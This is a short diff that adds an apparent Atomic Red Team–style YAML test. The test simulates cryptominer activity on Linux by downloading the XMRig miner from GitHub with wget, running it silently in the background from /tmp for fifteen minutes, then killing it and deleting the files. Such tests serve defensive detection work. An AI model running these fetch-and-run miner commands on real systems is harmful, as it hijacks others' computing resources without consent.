@@ -1,0 +1,18 @@
+attack_technique: Test
+display_name: Xmrig
+atomic_tests:
+- name: Run Xmrig
+  description: Download and run Xmrig
+  supported_platforms:
+    - linux
+  executor:
+    command: |
+      wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz 2>/dev/null
+      tar -xzf /tmp/xmrig.tar.gz -C /tmp
+      chmod +x /tmp/xmrig-6.18.0/xmrig
+      /tmp/xmrig-6.18.0/xmrig 1>/dev/null & XMRIG_PID=$!
+      sleep 900 && kill -9 $XMRIG_PID && wait $XMRIG_PID 2>/dev/null
+    cleanup_command: |
+      rm -rf /tmp/xmrig*
+    name: bash
+    elevation_required: false
